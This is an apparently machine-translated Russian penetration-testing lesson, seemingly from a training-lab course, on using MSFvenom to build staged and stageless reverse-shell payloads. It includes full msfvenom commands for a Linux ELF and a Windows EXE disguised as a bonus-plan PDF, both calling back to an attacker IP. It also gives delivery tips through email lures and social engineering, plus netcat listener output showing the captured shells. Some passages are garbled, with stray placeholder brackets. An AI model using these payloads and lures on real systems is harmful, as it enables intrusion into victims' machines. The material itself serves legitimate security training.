Необходимо помнить, что использование автоматизированных атак в Metasploit требует от нас доступа к уязвимой целевой машине по сети. Рассмотрим, что мы делали в предыдущем разделе. Для этого нам `run the exploit module`сначала нужно было связаться с системой. Это могло быть возможно благодаря присутствию во внутренней сети или сети, имеющей маршруты в сеть, где находится целевая машина. Однако бывают ситуации, когда у нас нет прямого сетевого доступа к уязвимой целевой машине. В таких случаях нам нужно будет проявить изобретательность в способе доставки и выполнения полезной нагрузки в системе. Одним из таких способов может быть создание полезной нагрузки и отправка её по электронной почте или другими средствами социальной инженерии, чтобы заставить пользователя выполнить файл.`deliver the payload``establish the shell session``MSFvenom`

Помимо предоставления полезной нагрузки с гибкими вариантами доставки, MSFvenom также позволяет нам `encrypt`обходить `encode`распространенные сигнатуры обнаружения антивирусов. Давайте немного попрактикуемся в этих понятиях.

---

## Практика с MSFvenom

В Pwnbox или на любом другом хосте с установленным MSFvenom можно выполнить команду `msfvenom -l payloads`для вывода списка всех доступных полезных нагрузок. Ниже приведены лишь некоторые из доступных полезных нагрузок. Некоторые полезные нагрузки были отредактированы, чтобы сократить вывод и не отвлекать от основного урока. Внимательно изучите полезные нагрузки и их описания:

#### Список полезных нагрузок

        shellsession
`MuraMitchi@htb[/htb]$ msfvenom -l payloads Framework Payloads (592 total) [--payload <value>] ==================================================     Name                                                Description    ----                                                ----------- linux/x86/shell/reverse_nonx_tcp                    Spawn a command shell (staged). Connect back to the attacker linux/x86/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker linux/x86/shell/reverse_tcp_uuid                    Spawn a command shell (staged). Connect back to the attacker linux/x86/shell_bind_ipv6_tcp                       Listen for a connection over IPv6 and spawn a command shell linux/x86/shell_bind_tcp                            Listen for a connection and spawn a command shell linux/x86/shell_bind_tcp_random_port                Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: 'nmap -sS target -p-'. linux/x86/shell_find_port                           Spawn a shell on an established connection linux/x86/shell_find_tag                            Spawn a shell on an established connection (proxy/nat safe) linux/x86/shell_reverse_tcp                         Connect back to attacker and spawn a command shell linux/x86/shell_reverse_tcp_ipv6                    Connect back to attacker and spawn a command shell over IPv6 linux/zarch/meterpreter_reverse_http                Run the Meterpreter / Mettle server payload (stageless) linux/zarch/meterpreter_reverse_https               Run the Meterpreter / Mettle server payload (stageless) linux/zarch/meterpreter_reverse_tcp                 Run the Meterpreter / Mettle server payload (stageless) mainframe/shell_reverse_tcp                         Listen for a connection and spawn a  command shell. This implementation does not include ebcdic character translation, so a client wi                                                         th translation capabilities is required. MSF handles this automatically. multi/meterpreter/reverse_http                      Handle Meterpreter sessions regardless of the target arch/platform. Tunnel communication over HTTP multi/meterpreter/reverse_https                     Handle Meterpreter sessions regardless of the target arch/platform. Tunnel communication over HTTPS netware/shell/reverse_tcp                           Connect to the NetWare console (staged). Connect back to the attacker nodejs/shell_bind_tcp                               Creates an interactive shell via nodejs nodejs/shell_reverse_tcp                            Creates an interactive shell via nodejs nodejs/shell_reverse_tcp_ssl                        Creates an interactive shell via nodejs, uses SSL osx/armle/execute/bind_tcp                          Spawn a command shell (staged). Listen for a connection osx/armle/execute/reverse_tcp                       Spawn a command shell (staged). Connect back to the attacker osx/armle/shell/bind_tcp                            Spawn a command shell (staged). Listen for a connection osx/armle/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker osx/armle/shell_bind_tcp                            Listen for a connection and spawn a command shell osx/armle/shell_reverse_tcp                         Connect back to attacker and spawn a command shell osx/armle/vibrate                                   Causes the iPhone to vibrate, only works when the AudioToolkit library has been loaded. Based on work by Charlie Miller library has been loaded. Based on work by Charlie Miller windows/dllinject/bind_hidden_tcp                   Inject a DLL via a reflective loader. Listen for a connection from a hidden port and spawn a command shell to the allowed host. windows/dllinject/bind_ipv6_tcp                     Inject a DLL via a reflective loader. Listen for an IPv6 connection (Windows x86) windows/dllinject/bind_ipv6_tcp_uuid                Inject a DLL via a reflective loader. Listen for an IPv6 connection with UUID Support (Windows x86) windows/dllinject/bind_named_pipe                   Inject a DLL via a reflective loader. Listen for a pipe connection (Windows x86) windows/dllinject/bind_nonx_tcp                     Inject a DLL via a reflective loader. Listen for a connection (No NX) windows/dllinject/bind_tcp                          Inject a DLL via a reflective loader. Listen for a connection (Windows x86) windows/dllinject/bind_tcp_rc4                      Inject a DLL via a reflective loader. Listen for a connection windows/dllinject/bind_tcp_uuid                     Inject a DLL via a reflective loader. Listen for a connection with UUID Support (Windows x86) windows/dllinject/find_tag                          Inject a DLL via a reflective loader. Use an established connection windows/dllinject/reverse_hop_http                  Inject a DLL via a reflective loader. Tunnel communication over an HTTP or HTTPS hop point. Note that you must first upload data/hop                                                         /hop.php to the PHP server you wish to use as a hop. windows/dllinject/reverse_http                      Inject a DLL via a reflective loader. Tunnel communication over HTTP (Windows wininet) windows/dllinject/reverse_http_proxy_pstore         Inject a DLL via a reflective loader. Tunnel communication over HTTP windows/dllinject/reverse_ipv6_tcp                  Inject a DLL via a reflective loader. Connect back to the attacker over IPv6 windows/dllinject/reverse_nonx_tcp                  Inject a DLL via a reflective loader. Connect back to the attacker (No NX) windows/dllinject/reverse_ord_tcp                   Inject a DLL via a reflective loader. Connect back to the attacker windows/dllinject/reverse_tcp                       Inject a DLL via a reflective loader. Connect back to the attacker windows/dllinject/reverse_tcp_allports              Inject a DLL via a reflective loader. Try to connect back to the attacker, on all possible ports (1-65535, slowly) windows/dllinject/reverse_tcp_dns                   Inject a DLL via a reflective loader. Connect back to the attacker windows/dllinject/reverse_tcp_rc4                   Inject a DLL via a reflective loader. Connect back to the attacker windows/dllinject/reverse_tcp_rc4_dns               Inject a DLL via a reflective loader. Connect back to the attacker windows/dllinject/reverse_tcp_uuid                  Inject a DLL via a reflective loader. Connect back to the attacker with UUID Support windows/dllinject/reverse_winhttp                   Inject a DLL via a reflective loader. Tunnel communication over HTTP (Windows winhttp)`

`What do you notice about the output?`

Мы можем заметить несколько деталей, которые помогут нам лучше понять полезную нагрузку. Прежде всего, мы видим, что соглашение об именовании полезной нагрузки почти всегда начинается с указания операционной системы целевого устройства ( `Linux`, `Windows`, `MacOS`, `mainframe`, и т. д.). Мы также видим, что некоторые полезные нагрузки описываются как ( `staged`) или ( `stageless`). Давайте рассмотрим разницу.

---

## Поэтапная и бесэтапная полезная нагрузка

`Staged`Полезные нагрузки создают способ отправки дополнительных компонентов нашей атаки. Можно представить это как «подготовку к чему-то еще более полезному». Возьмем, к примеру, эту полезную нагрузку `linux/x86/shell/reverse_tcp`. При запуске с помощью модуля эксплойта в Metasploit эта полезная нагрузка отправит небольшой код `stage`, который будет выполнен на целевом устройстве, а затем вызовет обратный вызов для `attack box`загрузки оставшейся части полезной нагрузки по сети, после чего выполнит шелл-код для создания обратной оболочки. Конечно, если мы используем Metasploit для запуска этой полезной нагрузки, нам потребуется настроить параметры, указывающие на правильные IP-адреса и порты, чтобы прослушиватель успешно перехватил оболочку. Имейте в виду, что этап также занимает место в памяти, что оставляет меньше места для полезной нагрузки. Что происходит на каждом этапе, может различаться в зависимости от полезной нагрузки.

`Stageless`В полезных нагрузках отсутствует этап обработки. Возьмем, к примеру, эту полезную нагрузку `linux/zarch/meterpreter_reverse_tcp`. Используя эксплойт-модуль в Metasploit, эта полезная нагрузка будет отправлена ​​целиком по сетевому соединению без этапа обработки. Это может быть полезно в средах с ограниченным доступом к пропускной способности, где задержки могут создавать проблемы. В таких средах полезные нагрузки с этапами обработки могут приводить к нестабильным сеансам командной оболочки, поэтому лучше выбрать полезную нагрузку без этапа обработки. Кроме того, полезные нагрузки без этапа обработки иногда лучше подходят для обхода защиты из-за меньшего объема трафика, проходящего по сети для выполнения полезной нагрузки, особенно если мы используем методы социальной инженерии. Эта концепция также очень хорошо объяснена компанией Rapid 7 в этой статье в блоге о [полезных нагрузках Meterpreter без этапа обработки](https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/) .

Теперь, когда мы понимаем разницу между поэтапной и неэтапной полезной нагрузкой, мы можем идентифицировать их в Metasploit. Ответ прост. `name`Первый маркер — это [укажите маркер]. Возьмем наши примеры выше: [укажите маркер] `linux/x86/shell/reverse_tcp`— это поэтапная полезная нагрузка, и мы можем определить это по имени, поскольку каждый символ / в ее имени обозначает этап, начиная с оболочки. Таким образом, [укажите маркер] `/shell/`— это этап отправки, а [ `/reverse_tcp`укажите маркер] — это еще один этап. В случае неэтапной полезной нагрузки все это будет выглядеть так, будто объединено вместе. Возьмем наш пример : [укажите `linux/zarch/meterpreter_reverse_tcp`маркер]. Он похож на поэтапную полезную нагрузку, за исключением того, что он указывает архитектуру, на которую влияет, а затем содержит полезную нагрузку оболочки и сетевые коммуникации в одной функции `/meterpreter_reverse_tcp`. В качестве последнего быстрого примера этой системы именования рассмотрим два [укажите маркер] `windows/meterpreter/reverse_tcp`и [укажите маркер `windows/meterpreter_reverse_tcp`]. Первый — это `Staged`полезная нагрузка. Обратите внимание на систему именования, разделяющую этапы. Второй — это `Stageless`полезная нагрузка, поскольку мы видим полезную нагрузку оболочки и сетевые коммуникации в одной части имени. Если имя полезной нагрузки вам не совсем понятно, в описании часто указывается, является ли полезная нагрузка поэтапной или неэтапной.

---

## Создание бесступенчатой ​​полезной нагрузки

Теперь давайте создадим простую бесступенчатую полезную нагрузку с помощью msfvenom и разберем команду.

#### Постройте это

        shellsession
`MuraMitchi@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 74 bytes Final size of elf file: 194 bytes`

#### Позвоните MSFvenom

        shellsession
`msfvenom`

Определяет инструмент, используемый для создания полезной нагрузки.

#### Создание полезной нагрузки

        shellsession
`-p`

Это `option`указывает на то, что msfvenom создает полезную нагрузку.

#### Выбор полезной нагрузки на основе архитектуры

        shellsession
`linux/x64/shell_reverse_tcp`

Указывает `Linux` `64-bit`бесступенчатую полезную нагрузку, которая инициирует обратную оболочку на основе TCP ( `shell_reverse_tcp`).

#### Адрес для обратной связи

        shellsession
`LHOST=10.10.14.113 LPORT=443`

При выполнении полезная нагрузка будет осуществлять обратный вызов на указанный IP-адрес ( `10.10.14.113`) на указанном порту ( `443`).

#### Формат для генерации полезной нагрузки в

        shellsession
`-f elf`

Этот `-f`флаг указывает формат сгенерированного бинарного файла. В данном случае это будет [файл с расширением .elf](https://en.wikipedia.org/wiki/Executable_and_Linkable_Format) .

#### Выход

        shellsession
`> createbackup.elf`

Создаёт исполняемый файл .elf и присваивает ему имя createbackup. Мы можем назвать этот файл как угодно. В идеале, мы бы назвали его чем-нибудь незаметным и/или таким, которое вызвало бы у кого-нибудь желание скачать и запустить.

---

## Выполнение бесступенчатой ​​полезной нагрузки

На данном этапе у нас уже создана полезная нагрузка на нашем атакующем устройстве. Теперь нам нужно разработать способ доставки этой полезной нагрузки в целевую систему. Существует бесчисленное множество способов сделать это. Вот лишь некоторые из распространенных:

- Электронное письмо с прикрепленным файлом.
- Ссылка для скачивания на сайте.
- В сочетании с эксплойт-модулем Metasploit (для этого, вероятно, потребуется уже находиться во внутренней сети).
- С помощью флеш-накопителя в рамках тестирования на проникновение на месте.

После того как файл окажется в системе, его также необходимо будет выполнить.

Представьте на мгновение: целевая машина — это компьютер с Ubuntu, который ИТ-администратор использует для управления сетевыми устройствами (размещение скриптов конфигурации, доступ к маршрутизаторам и коммутаторам и т. д.). Мы могли бы заставить их открыть файл в отправленном нами электронном письме, потому что они небрежно использовали эту систему, как если бы это был персональный компьютер или рабочая станция.

#### Полезная нагрузка Ubuntu

![В проводнике файлов на системе Linux отображается файл 'createbackup.elf' в папке "Загрузки".](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/115/ubuntupayload.png)

В случае успешного выполнения атаки у нас будет готов обработчик событий на стороне атакующего устройства.

#### NC Connection

        shellsession
`MuraMitchi@htb[/htb]$ sudo nc -lvnp 443`

При выполнении файла мы видим, что перехватили командную оболочку.

#### Соединение установлено.

        shellsession
`MuraMitchi@htb[/htb]$ sudo nc -lvnp 443 Listening on 0.0.0.0 443 Connection received on 10.129.138.85 60892 env PWD=/home/htb-student/Downloads cd .. ls Desktop Documents Downloads Music Pictures Public Templates Videos`

Этот же принцип можно использовать для создания полезных нагрузок для различных платформ, включая Windows.

---

## Создание простой бесшаговой полезной нагрузки для системы Windows.

Мы также можем использовать msfvenom для создания исполняемого `.exe`файла ( ), который можно запустить в системе Windows, чтобы получить доступ к командной оболочке.

#### Полезная нагрузка Windows

        shellsession
`MuraMitchi@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder specified, outputting raw payload Payload size: 324 bytes Final size of exe file: 73802 bytes`

Синтаксис команды можно разобрать так же, как мы это делали выше. Единственные отличия, конечно, заключаются в скобках `platform`( `Windows`) и формате ( `.exe`) полезной нагрузки.

---

## Выполнение простой бесступенчатой ​​полезной нагрузки в системе Windows.

Это еще одна ситуация, когда нам нужно проявить изобретательность, чтобы доставить этот полезный груз в целевую систему. Без каких-либо `encoding`дополнительных условий `encryption`полезный груз в таком виде почти наверняка будет обнаружен антивирусом Windows Defender.

![В проводнике файлов в папке «Загрузки» на компьютере с Windows отображается файл «BonusCompensationPlan.pdf».](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/115/winpayload.png)

Если антивирус отключен, пользователю достаточно будет дважды щелкнуть по файлу для его запуска, и у нас будет открыта командная строка.

        shellsession
`MuraMitchi@htb[/htb]$ sudo nc -lvnp 443 Listening on 0.0.0.0 443 Connection received on 10.129.144.5 49679 Microsoft Windows [Version 10.0.18362.1256] (c) 2019 Microsoft Corporation. All rights reserved. C:\Users\htb-student\Downloads>dir dir  Volume in drive C has no label. Volume Serial Number is DD25-26EB  Directory of C:\Users\htb-student\Downloads 09/23/2021  10:26 AM    <DIR>          . 09/23/2021  10:26 AM    <DIR>          .. 09/23/2021  10:26 AM            73,802 BonusCompensationPlanpdf.exe                1 File(s)         73,802 bytes               2 Dir(s)   9,997,516,800 bytes free`